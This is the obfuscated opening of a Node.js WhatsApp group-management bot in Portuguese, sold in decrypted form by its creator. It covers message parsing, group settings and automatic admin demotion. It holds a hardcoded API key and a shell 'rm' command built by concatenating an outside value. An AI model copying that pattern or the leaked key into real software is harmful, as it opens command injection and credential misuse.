/*
 [ X-BOT VERSÃO CRIPTOGRAFADO FREE ]
  
  CASO QUEIRA ELE TOTALMENTE DESCRIPTOGRAFADO, COMPRE JA COM O CRIADOR OFC
  
    CRIADOR: @JEFFERSON_DDOS
    WHATSAPP: 3299240466

*/
const {
  prepareWAMessageMedia,
  downloadContentFromMessage,
  relayWAMessage,
  mentionedJid,
  processTime,
  MediaType,
  Browser,
  MessageType,
  Presence,
  Mimetype,
  Browsers,
  delay,
  getLastMessageInChat,
  proto,
  generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const {
  fs,
  path,
  Boom,
  axios,
  yts,
  crypto,
  util,
  P,
  linkfy,
  request,
  cheerio,
  ms,
  ffmpeg,
  webp_mp4,
  qrterminal,
  exec,
  spawn,
  execSync,
  moment,
  color,
  time,
  hora,
  date,
  getBuffer,
  convertSticker,
  recognize,
  fetchJson,
  fetchText,
  getBase64,
  createExif,
  response,
  addLimit,
  upload,
  upload2,
  nit,
  addBanned,
  unBanned,
  BannedExpired,
  cekBannedUser,
  validmove,
  setGame,
  addComandosId,
  deleteComandos,
  getComandoBlock,
  getComandos,
  addComandos,
  palavrasANA,
  getpc,
  supre,
  wait,
  rgtake,
  getExtension,
  generateMessageID,
  getGroupAdmins,
  getMembros,
  getRandom,
  banner2,
  addFilter,
  isFiltered,
  antiporn,
  modopuxas,
  modoalugue,
  sabrpg,
  autorpg,
  modoaluguelpix,
  bcbet,
  minerar,
  cavalosrpg,
  elitepasse,
  coderpg,
  galosrpg,
  roubosrpg,
  banner3,
  temporizador,
  chyt,
  kyun,
  simih,
  botoff,
  colors,
  quizanimais,
  garticArchives,
  whatMusicAr,
  psycatgames,
  sendPoll,
  enigmaArchive,
  comand,
  RSM_FUNC,
  insert,
  respon
} = require("./consts-func.js");
const {
  menu,
  muted,
  rpgmenu,
  anotacao,
  menudono,
  adms,
  menulogos,
  efeitos,
  menuprem,
  brincadeiras,
  infocontador,
  infobemvindo,
  infolistanegra,
  infoaluguel,
  infotransmitir,
  infopalavrao,
  infobancarac,
  infodono,
  gitdobot,
  configbot,
  hospedar,
  cmd_termux,
  alteradores,
  destrava,
  destrava2,
  mess,
  tabela,
  conselhob,
  palavrasc,
  ban,
  joguinhodavelhajs,
  joguinhodavelhajs2,
  nescessario,
  setting,
  logoslink,
  logopuxadas,
  premium,
  rg_aluguel,
  countMessage,
  sendVideoAsSticker,
  sendImageAsSticker,
  sendVideoAsSticker2,
  sendImageAsSticker2,
  sotoy,
  daily,
  comandos,
  limitefll,
  mines,
  getMinesPositions,
  MinesHelp,
  addVote,
  delVote,
  patentes,
  antispam,
  rggold,
  anotar,
  black_,
  enviarfiguUrl,
  getFileBuffer,
  DLT_FL,
  sleep,
  ANT_LTR_MD_EMJ,
  EnvBotao
} = require("./consts-func.js");
function carregarJSON(_0x254d4f) {
  try {
    const _0x3641a6 = fs.readFileSync(_0x254d4f, "utf8");
    return JSON.parse(_0x3641a6);
  } catch (_0x52a73e) {
    if (_0x52a73e.code === "ENOENT") {
      return {};
    }
    console.error("Erro ao carregar o arquivo JSON (" + _0x254d4f + "):", _0x52a73e);
    return {};
  }
}
function salvarJSON(_0x49a862, _0x2f92fe) {
  try {
    fs.writeFileSync(_0x49a862, JSON.stringify(_0x2f92fe, null, 2));
    return true;
  } catch (_0x5e09af) {
    console.error("Erro ao salvar JSON:", _0x5e09af);
    return false;
  }
}
const {
  minado_bomb
} = require("./DADOS/links.json");
const {
  mediafire
} = require("./lib/mediafire");
const {
  arcloud
} = require("./lib/shazam.js");
const {
  Sticker
} = require("./lib/sticker");
const {
  menuinfos,
  menubotao,
  menuia,
  menudownloads,
  informacoes,
  menujogos,
  menufigurinhas,
  downloadjogos,
  menunsfw,
  outroscmds,
  puxadas,
  comandos_de_membros,
  menu_dono,
  ativacoes_dono,
  menu_adm,
  ativacoes_adm,
  botao_menu,
  ativacoesdono,
  ativacoesadm,
  menu_premium,
  menu_efeitos,
  menu_logos,
  efeitos_audio_videos,
  sub_menu,
  menu_brincadeiras,
  menu_fotoshop,
  menu_rpg,
  menu_infos,
  inteligencia_artificial,
  menu_downloads,
  menu_informacoes,
  menu_jogos,
  menu_figurinhas,
  jogos_apks,
  menu_nsfw,
  menu_puxadas,
  ping,
  dono,
  avalie,
  tituloproduto1,
  SubtituloProduto1,
  tituloproduto2,
  SubtituloProduto2,
  tituloproduto3,
  SubtituloProduto3,
  tituloproduto4,
  SubtituloProduto4,
  tituloproduto5,
  SubtituloProduto5,
  tituloproduto6,
  SubtituloProduto6,
  tituloproduto7,
  SubtituloProduto7,
  tituloproduto8,
  SubtituloProduto8,
  PreçoProduto1,
  PreçoProduto2,
  PreçoProduto3,
  PreçoProduto4,
  PreçoProduto5,
  PreçoProduto6,
  PreçoProduto7,
  PreçoProduto8,
  TabelaAluguel,
  TituloAluguel1,
  SubtituloAluguel1,
  TituloAluguel2,
  SubtituloAluguel2,
  TituloAluguel3,
  SubtituloAluguel3,
  TituloAluguel4,
  SubtituloAluguel4,
  TituloAluguel5,
  SubtituloAluguel5,
  TituloAluguel6,
  SubtituloAluguel6,
  preço1,
  preço2,
  preço3,
  preço4,
  preço5,
  preço6
} = require("./menus/menus/menus.js");
const {
  Aki
} = require("aki-api");
const _0xd645d6 = {
  jogador: "",
  now: true
};
const jogo = _0xd645d6;
const akinatorjson = "./DADOS/usuarios/usuarios/akinator.json";
const akinator = JSON.parse(fs.readFileSync("./DADOS/usuarios/usuarios/akinator.json"));
const assemblyAI = require("assemblyai");
const jsobfus = require("javascript-obfuscator");
const infoSystem = require("os");
const momento = require("moment-timezone");
require("moment/locale/pt-br");
momento.locale("pt-br");
const dayy = momento.tz("America/Sao_Paulo").format("dddd");
const momo = require("moment-timezone");
require("moment/locale/pt-br");
momo.locale("pt-br");
const D = momo.tz("America/Sao_Paulo").format("DD/MM/YYYY");
const momenthora = require("moment-timezone");
require("moment/locale/pt-br");
momenthora.locale("pt-br");
const H = momenthora.tz("America/Sao_Paulo").format("HH:mm:ss");
var numerosAvaliados = new Set();
var {
  botoes_,
  forwarding,
  crtt,
  visualizarmsg,
  dono1,
  dono2,
  dono3,
  dono4,
  dono5,
  dono6,
  msgantipv1,
  msgantipv2,
  SITE_JEFF_APIS
} = require("./DADOS/Dono/nescessario.json");
var {
  fundo1,
  fundo2,
  imgnazista,
  imggay,
  imgcorno,
  imggostosa,
  imggostoso,
  imgfeio,
  imgvesgo,
  imgbebado,
  imggado,
  matarcmd,
  beijocmd,
  chutecmd,
  tapacmd,
  rnkgay,
  rnkgado,
  rnkcorno,
  rnkgostoso,
  rnkgostosa,
  rnknazista,
  rnkotaku,
  rnkpau
} = require("./DADOS/links.json");
var {
  NomeDoBot,
  NickDono,
  prefix
} = require("./DADOS/Dono/settings.json");
const necess = JSON.parse(fs.readFileSync("./DADOS/Dono/nescessario.json"));
const figurinhas = JSON.parse(fs.readFileSync("./DADOS/usuarios/data/figurinhas.json"));
const recolherLNK = JSON.parse(fs.readFileSync("./DADOS/recolherLNK.json"));
const casamento1 = JSON.parse(fs.readFileSync("./DADOS/casamento/casamento1.json"));
const casamento2 = JSON.parse(fs.readFileSync("./DADOS/casamento/casamento2.json"));
const II = "•";
const F = "`";
const lermais = "‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎";
let scriptProcess;
const infoerror = "Erro.. o Site de apis está em manutenção no momento, ou o comando está instável ";
const lolhuman = "58a170b87ab8daa1bfd3b6e4";
const versão = JSON.parse(fs.readFileSync("./package.json")).version;
var numerodono_ofc = setting.numerodono.replace(new RegExp("[()+-/ +/]", "gi"), "");
async function reiniciarALE() {
  file = require.resolve("./iniciar.js");
  delete require.cache[file];
  require(file);
}
async function loading() {
  var _0x37d754 = ["ʟᴏᴀᴅɪɴɢ\n《 █▒▒▒▒▒▒▒▒▒▒▒》10%", "ʟᴏᴀᴅɪɴɢ\n《 ████▒▒▒▒▒▒▒▒》30%", "ʟᴏᴀᴅɪɴɢ\n《 ███████▒▒▒▒▒》50%", "ʟᴏᴀᴅɪɴɢ\n《 ██████████▒▒》80%", "ʟᴏᴀᴅɪɴɢ\n《 ████████████》100%", "𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 ✅..."];
  var {
    key: _0x552a31
  } = await conn.sendMessage(from, {
    text: "ʟᴏᴀᴅɪɴɢ..."
  });
  for (let _0x3e2aae = 0; _0x3e2aae < _0x37d754.length; _0x3e2aae++) {
    const _0x383a47 = {
      text: _0x37d754[_0x3e2aae],
      edit: _0x552a31
    };
    await conn.sendMessage(from, _0x383a47);
    if (_0x3e2aae < _0x37d754.length - 1) {
      await new Promise(_0x20228f => setTimeout(_0x20228f, 1000));
    }
  }
}
async function loading2() {
  var _0x4c73e3 = ["ʟᴏᴀᴅɪɴɢ\n《 █▒▒▒▒▒▒▒▒▒▒▒》10%", "ʟᴏᴀᴅɪɴɢ\n《 ████▒▒▒▒▒▒▒▒》30%", "ʟᴏᴀᴅɪɴɢ\n《 ███████▒▒▒▒▒》50%", "ʟᴏᴀᴅɪɴɢ\n《 ██████████▒▒》80%", "ʟᴏᴀᴅɪɴɢ\n《 ████████████》100%", "𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 ✅..."];
  var {
    key: _0x463bea
  } = await conn.sendMessage(from, {
    text: "ʟᴏᴀᴅɪɴɢ..."
  });
  for (let _0x56c9e5 = 0; _0x56c9e5 < _0x4c73e3.length; _0x56c9e5++) {
    const _0x472f77 = {
      text: _0x4c73e3[_0x56c9e5],
      edit: _0x463bea
    };
    await conn.sendMessage(from, _0x472f77);
    if (_0x56c9e5 < _0x4c73e3.length - 1) {
      await new Promise(_0x24db99 => setTimeout(_0x24db99, 2000));
    }
  }
}
var AsMsg = [];
async function startAle() {
  module.exports = conn = async (_0x261777, _0x830a28, _0x44a335, _0x512d5e) => {
    module.exports = upsert = async (_0xb95518, _0x263319) => {
      async function _0x233fc4() {
        const _0x52a2cc = setting.numerodono.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net";
        var _0x263ebb = moment.tz().tz("America/Sao_Paulo").format("HH:mm:ss");
        RSM_FUNC(_0x263319, _0x52a2cc, _0x263ebb, _0xb95518);
        for (const _0x302296 of _0xb95518?.messages || []) {
          const _0x4f1071 = _0x302296.key.remoteJid;
          const _0xd20756 = _0x4f1071.endsWith("@g.us");
          if (fs.existsSync("./DADOS/grupos/" + _0x4f1071 + ".json")) {
            var _0x20e786 = JSON.parse(fs.readFileSync("./DADOS/grupos/" + _0x4f1071 + ".json"));
          }
          if (fs.existsSync("./DADOS/grupos/" + _0x4f1071 + ".json") && _0x20e786[0].x9 && _0x302296.messageStubType) {
            switch (_0x302296.messageStubType) {
              case 29:
                await delay(1000);
                _0x263319.sendMessage(_0x302296.key.remoteJid, {
                  text: "O usuario @" + _0x302296.messageStubParameters[0].split("@")[0] + " foi promovido pelo @" + _0x302296.participant.split("@")[0],
                  mentions: [_0x302296.messageStubParameters[0], _0x302296.participant]
                });
                break;
              case 30:
                await delay(1000);
                _0x263319.sendMessage(_0x302296.key.remoteJid, {
                  text: "O ADM @" + _0x302296.messageStubParameters[0].split("@")[0] + " foi rebaixado para membro comum pelo adm @" + _0x302296.participant.split("@")[0],
                  mentions: [_0x302296.messageStubParameters[0], _0x302296.participant]
                });
                break;
            }
          }
          try {
            var _0xf7f183 = _0xd20756 ? await _0x263319.groupMetadata(_0x4f1071) : "";
          } catch {
            return;
          }
          const _0x5b3ba6 = _0xd20756 ? _0xf7f183.participants : "";
          const _0x2aa963 = _0xd20756 ? getGroupAdmins(_0x5b3ba6) : "";
          const _0x32e455 = _0xd20756 ? _0x302296.key.participant.includes(":") ? _0x302296.key.participant.split(":")[0] + "@s.whatsapp.net" : _0x302296.key.participant : _0x302296.key.remoteJid;
          let _0x59c3e0 = carregarJSON("./DADOS/grupos/grupo_" + _0x4f1071 + ".json");
          if (_0x59c3e0 && _0x59c3e0.donos && !_0x59c3e0.donos.includes(_0xd20756 ? _0x302296.key.participant : _0x4f1071) && _0x59c3e0.protecaoAtivada && _0x302296.messageStubType) {
            switch (_0x302296.messageStubType) {
              case 29:
                await delay(3000);
                await _0x263319.sendMessage(_0x4f1071, {
                  text: "\n⚠️ ALERTA ADMINISTRADORES ⚠️\n\n👤 ADM PROMOVIDO:\n@" + _0x302296.messageStubParameters[0].split("@")[0] + "\n\n\n😎 PELO ADM @" + _0x302296.participant.split("@")[0] + "\n\n🚨 AVISO: Este administrador foi rebaixado automaticamente por tentar promover outro membro sem permissão. Como resultado, ambos foram rebaixados.\n\n👨‍✈️ Admin responsável:\n@" + _0x32e455.split("@")[0] + "\n",
                  mentions: [_0x302296.messageStubParameters[0], _0x302296.participant, ..._0x2aa963]
                });
                await _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x302296.messageStubParameters[0], _0x302296.participant], "demote");
                break;
              case 30:
                await delay(3000);
                await _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x302296.participant], "demote");
                await _0x263319.sendMessage(_0x4f1071, {
                  text: "\n⚠️ ALERTA ADMINISTRADORES ⚠️\n\n👤 ADM REBAIXADO:\n@" + _0x302296.messageStubParameters[0].split("@")[0] + "\n\n😎 PELO ADM @" + _0x302296.participant.split("@")[0] + "\n\n🚨 AVISO: Este administrador foi rebaixado automaticamente por tentar rebaixar outro membro sem permissão. Como resultado, ambos foram rebaixados.\n\n👨‍✈️ Admin responsável:\n@" + _0x32e455.split("@")[0] + "\n",
                  mentions: [_0x302296.messageStubParameters[0], _0x302296.participant, ..._0x2aa963]
                });
                break;
            }
          }
          if (!_0x302296.message) {
            return;
          }
          if (_0xb95518.type == "append") {
            return;
          }
          const _0x4095df = require("@whiskeysockets/baileys");
          const _0x51a818 = _0x4095df.getContentType(_0x302296.message);
          const _0x183b6c = JSON.stringify(_0x302296.message);
          const _0xd98cb9 = _0x302296.pushName ? _0x302296.pushName : "Usuário";
          if (visualizarmsg) {
            await _0x263319.readMessages([_0x302296.key]);
          } else if (_0x4f1071 == "status@broadcast") {
            return;
          }
          global.prefix;
          global.blocked;
          const _0x3eb4bd = require("performance-now");
          var _0x2e320b = _0x302296.message?.conversation || _0x302296.message?.viewOnceMessageV2?.message?.imageMessage?.caption || _0x302296.message?.viewOnceMessageV2?.message?.videoMessage?.caption || _0x302296.message?.imageMessage?.caption || _0x302296.message?.videoMessage?.caption || _0x302296.message?.extendedTextMessage?.text || _0x302296.message?.viewOnceMessage?.message?.videoMessage?.caption || _0x302296.message?.viewOnceMessage?.message?.imageMessage?.caption || _0x302296.message?.documentWithCaptionMessage?.message?.documentMessage?.caption || _0x302296.message?.buttonsMessage?.imageMessage?.caption || _0x302296.message?.buttonsResponseMessage?.selectedButtonId || _0x302296.message?.listResponseMessage?.singleSelectReply?.selectedRowId || _0x302296.message?.templateButtonReplyMessage?.selectedId || (_0x302296.message?.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson ? JSON.parse(_0x302296.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : null) || _0x302296?.text || "";
          var _0x2c281f = _0x302296.message?.conversation || _0x302296.message?.viewOnceMessageV2?.message?.imageMessage?.caption || _0x302296.message?.viewOnceMessageV2?.message?.videoMessage?.caption || _0x302296.message?.imageMessage?.caption || _0x302296.message?.videoMessage?.caption || _0x302296.message?.extendedTextMessage?.text || _0x302296.message?.viewOnceMessage?.message?.videoMessage?.caption || _0x302296.message?.viewOnceMessage?.message?.imageMessage?.caption || _0x302296.message?.documentWithCaptionMessage?.message?.documentMessage?.caption || _0x302296.message?.buttonsMessage?.imageMessage?.caption || "";
          const _0x40e45c = _0x2e320b.trim().split(/ +/).slice(1);
          var _0x3ad850 = _0x2e320b.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
          if (_0xd20756 && fs.existsSync("./DADOS/grupos/" + _0x4f1071 + ".json") && _0x20e786[0].multiprefix) {
            var _0x1d93be = _0x20e786[0]?.prefixs[_0x20e786[0]?.prefixs?.indexOf(String(_0x2e320b)?.trim()?.charAt(0))] || _0x20e786[0].prefixs[0];
          }
          if (_0xd20756 && fs.existsSync("./DADOS/grupos/" + _0x4f1071 + ".json") && !_0x20e786[0].multiprefix) {
            var _0x1d93be = setting.prefix;
          } else if (!_0xd20756) {
            var _0x1d93be = setting.prefix;
          }
          ;
          var _0x52ab25 = _0x2e320b.trim().startsWith(_0x1d93be);
          const _0x3dec88 = _0x52ab25 ? _0x3ad850.trim().slice(1).split(/ +/).shift().toLocaleLowerCase() : null;
          const _0x5397e2 = _0x3ad850.trim().split(/ +/).slice(1).join(" ");
          const _0x1d6557 = _0x40e45c.join(" ");
          var _0xf87dd3 = _0x51a818 === "conversation" ? _0x302296.message?.conversation : _0x51a818 === "extendedTextMessage" ? _0x302296.message?.extendedTextMessage?.text : "";
          var _0x11f1f5 = _0xf87dd3.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
          var _0x2a2fa4 = _0x2c281f.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
          const _0x120f74 = _0x2a2fa4.trim().split(/ +/).slice(1).join(" ");
          const _0x471350 = _0xd20756 ? _0xf7f183.subject : "";
          const _0x3381b5 = _0x2a2fa4.slice(0).trim().split(/ +/).shift().toLowerCase();
          const _0x56b423 = _0x2e320b.substring(_0x2e320b.indexOf(" ") + 1);
          const _0x2dd81a = (await _0x263319.user.id.split(":")[0]) + "@s.whatsapp.net";
          const _0x1f217d = _0x2e320b.split(/ +/g);
          const _0x39dad7 = _0x2e320b;
          const _0x1c051c = _0x2e320b;
          const _0x359fc4 = _0xd20756 ? _0xf7f183.desc : "";
          const _0x35021e = nit.includes(_0x32e455);
          const _0x335a29 = supre.includes(_0x32e455);
          const _0x594818 = chyt.includes(_0x32e455);
          const _0x1bed8b = _0xd20756 ? getMembros(_0x5b3ba6) : "";
          if (_0xd20756 && fs.existsSync("./DADOS/sairgp/sairgp-" + _0x4f1071 + ".json")) {
            const _0x889bc9 = JSON.parse(fs.readFileSync("./DADOS/sairgp/sairgp-" + _0x4f1071 + ".json"));
            datinhaofc = moment.tz("America/Sao_Paulo").format("DD/MM/YY");
            if (datinhaofc == _0x889bc9.Data_de_sair) {
              group = await _0x263319.groupMetadata(_0x4f1071);
              member = group.participants;
              mem = [];
              member.map(async _0x554496 => {
                mem.push(_0x554496.id.replace("c.us", "s.whatsapp.net"));
              });
              const _0x1d238d = {
                text: "Atenção membros, aqui quem está falando é o bot com a mensagem automática, sairei do grupo por o tempo que foi realizado no dia que alugou, completou 30 dias....",
                mentions: mem,
                quoted: _0x302296
              };
              options = _0x1d238d;
              _0x263319.sendMessage(_0x4f1071, options);
              exec("cd func && cd sairgp && rm sairgp-" + _0x4f1071 + ".json");
              setTimeout(async () => {
                _0x403602(_0x1d93be + "sairgp");
              }, 5000);
            }
          }
          const _0x3a52d1 = setting.numerodono.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net" || _0x35021e;
          const _0x27033e = ["" + _0x3a52d1, dono1 + "@s.whatsapp.net", dono2 + "@s.whatsapp.net", dono3 + "@s.whatsapp.net", dono4 + "@s.whatsapp.net", dono5 + "@s.whatsapp.net", dono6 + "@s.whatsapp.net"];
          const {
            infosorteio: _0x488ab3
          } = require("./armor/js/infosorteio.js");
          const {
            mensagens: _0x342b78
          } = require("./armor/js/aleatoria.js");
          const {
            sortear: _0x5889b0
          } = require("./armor/js/aleatoria.js");
          var _0x178e38 = _0x342b78[Math.floor(Math.random() * _0x342b78.length)];
          const _0x4eb57a = _0x4ea141 => {
            const _0x5049f2 = {
              text: _0x4ea141,
              key: _0x302296.key
            };
            const _0x4fa988 = {
              react: _0x5049f2
            };
            _0x263319.sendMessage(_0x4f1071, _0x4fa988);
          };
          const _0x1c2557 = "./DADOS/grupos/" + _0x4f1071 + ".json";
          const _0x2044df = "./DADOS/Dono/nescessario.json";
          if (_0xd20756 && !fs.existsSync(_0x1c2557)) {
            const _0x3ef41c = {
              active: false,
              palavras: []
            };
            const _0x49050a = {
              active: false,
              quantidade: null
            };
            const _0x41f022 = {
              bemvindo1: false,
              legendabv: "Olá #numerodele#, seja bem vindo (a)",
              legendasaiu: 0
            };
            const _0x4453ac = {
              bemvindo2: false,
              legendabv: "Olá #numerodele#, seja bem vindo (a)",
              legendasaiu: 0
            };
            const _0x14c4e7 = {
              name: _0x471350,
              groupId: _0x4f1071,
              x9: false,
              antiimg: false,
              antivideo: false,
              antiaudio: false,
              antisticker: false,
              antidoc: false,
              antictt: false,
              antiloc: false,
              antilinkgp: false,
              antilinkhard: false,
              antifake: false,
              Odelete: false,
              antispam: false,
              antinotas: false,
              anticatalogo: false,
              sistemGold: false,
              visuUnica: false,
              registrarFIGUS: false,
              soadm: false,
              listanegra: [],
              advertir: [],
              prefixs: ["!"],
              advertir2: [],
              legenda_estrangeiro: "0",
              legenda_documento: "0",
              legenda_video: "0",
              legenda_imagem: "0",
              multiprefix: false,
              forca_ofc: [{
                acertos: 0,
                erros: 0,
                palavra: [],
                escreveu: [],
                palavra_ofc: 0,
                dica: 0,
                tema: 0
              }],
              minerar_gold: [],
              ausentes: [],
              forca_inc: false,
              antipalavrao: _0x3ef41c,
              limitec: _0x49050a,
              wellcome: [_0x41f022, _0x4453ac],
              simi1: false,
              simi2: false,
              autosticker: false,
              autoresposta: false,
              AdmSemprefixo: false,
              autotext: false,
              autobaixar: false,
              jogos: false,
              level: false,
              bangp: false,
              nsfw: false,
              aluguel: false
            };
            var _0x105f0a = [_0x14c4e7];
            fs.writeFileSync(_0x1c2557, JSON.stringify(_0x105f0a, null, 2) + "\n");
          }
          const _0x3bd584 = _0xd20756 ? JSON.parse(fs.readFileSync(_0x1c2557)) : undefined;
          var _0x34e850 = "./DADOS/prefix/multip_" + _0x4f1071 + ".json";
          function _0x33e29e(_0x86b8c1) {
            fs.writeFileSync(_0x1c2557, JSON.stringify(_0x86b8c1, null, 2) + "\n");
          }
          function _0x130557(_0x50da72) {
            fs.writeFileSync(_0x2044df, JSON.stringify(_0x50da72, null, 2) + "\n");
          }
          const _0x5e33af = _0x302296.key.id.length > 21 ? "Android ツ" : _0x302296.key.id.substring(0, 2) == "3A" ? "IPhone ｯ" : "WhatsApp web シ";
          const _0x46dee9 = _0x302296.quoted ? _0x302296.quoted : _0x302296;
          const _0x3d46e3 = _0x46dee9?.info?.mimetype || _0x46dee9?.mimetype || _0x302296?.message?.[_0x302296?.type]?.mimetype || undefined;
          const _0x3663a1 = _0x302296.key.fromMe ? true : false;
          const _0x5334e8 = JSON.parse(fs.readFileSync("./DADOS/moderação.json"));
          const _0xf7ec9d = JSON.parse(fs.readFileSync("./DADOS/AdvStaff.json"));
          const _0x44a98e = JSON.parse(fs.readFileSync("./DADOS/direção.json"));
          const _0xc5313b = JSON.parse(fs.readFileSync("./DADOS/donozin.json"));
          const _0x41b3f2 = _0x5334e8.includes(_0x32e455);
          const _0x17d886 = _0x27033e.includes(_0x32e455) || _0xc5313b.includes(_0x32e455);
          const _0x2a5ff3 = _0x27033e.includes(_0x32e455) || _0x3663a1 || _0x35021e || _0x335a29 || _0x594818 || _0x17d886;
          const _0x307eb2 = _0x44a98e.includes(_0x32e455) || _0x17d886;
          dfndofc = setting.numerodono + "@s.whatsapp.net";
          const _0x1471ff = dfndofc.includes(_0x32e455);
          const _0x578612 = "" + _0x32e455.split("@")[0];
          var _0x38b1b5 = false;
          if (_0x38b1b5) {
            var _0x38b1b5 = true;
          } else {
            var _0x38b1b5 = premium.some(_0x4e29d5 => _0x4e29d5.id === _0x578612);
          }
          const _0x2f2081 = _0x38b1b5 ? "sim" : "não";
          const _0x12023a = JSON.parse(fs.readFileSync("./DADOS/usuarios/proteção.json"));
          dfndofc = setting.numerodono + "@s.whatsapp.net";
          const _0x5550bd = _0x2aa963.includes(_0x2dd81a) || false;
          const _0x150e9e = _0x2aa963.includes(_0x32e455) || false || _0x1471ff;
          const _0xf2654c = ban.includes(_0x32e455);
          const _0x5b41aa = nescessario.visualizarmsg;
          const _0x1ed4d5 = "./DADOS/" + _0x578612 + ".json";
          var _0x38b1b5 = false;
          if (_0x38b1b5) {
            var _0x38b1b5 = true;
          } else {
            var _0x38b1b5 = premium.some(_0x2c9b0e => _0x2c9b0e.id === _0x578612);
          }
          const {
            spawn: _0x3dd216
          } = require("child_process");
          const _0x26d981 = nescessario.KEY_MERCADO_PAGO;
          const _0x1e3043 = JSON.parse(fs.readFileSync("./DADOS/aluguel/aluguel.json"));
          const _0x565fa1 = JSON.parse(fs.readFileSync("./DADOS/aluguel/grupos.json"));
          const _0x4c107d = JSON.parse(fs.readFileSync("./DADOS/aluguel/moedas.json"));
          const _0x167068 = nescessario.verificado;
          const _0x351d91 = nescessario.menu_audio;
          const _0x5346a2 = nescessario.banChats;
          const _0x2ae91c = nescessario.antipv3;
          const _0x303ef4 = nescessario.consoleoff;
          const _0xf63551 = nescessario.botoff;
          const _0x48d62e = nescessario.listanegraG;
          const _0x2129b6 = nescessario.antipv;
          const _0x2ea32a = nescessario.anticall;
          const _0x1ed966 = nescessario.TOKEN_GPT;
          const _0x3dc931 = nescessario.cmd_premium;
          const _0x2b1652 = nescessario.blockCmdG;
          const _0x460bdc = _0xd20756 ? joguinhodavelhajs.includes(_0x32e455) : false;
          const _0x416e68 = _0xd20756 ? _0x3bd584[0].antiimg : undefined;
          const _0x53df47 = _0xd20756 ? _0x3bd584[0].antivideo : undefined;
          const _0xb6a765 = _0xd20756 ? _0x3bd584[0].antiaudio : undefined;
          const _0x4233ab = _0xd20756 ? _0x3bd584[0].antisticker : undefined;
          const _0x367ec0 = _0xd20756 ? _0x3bd584[0].antidoc : undefined;
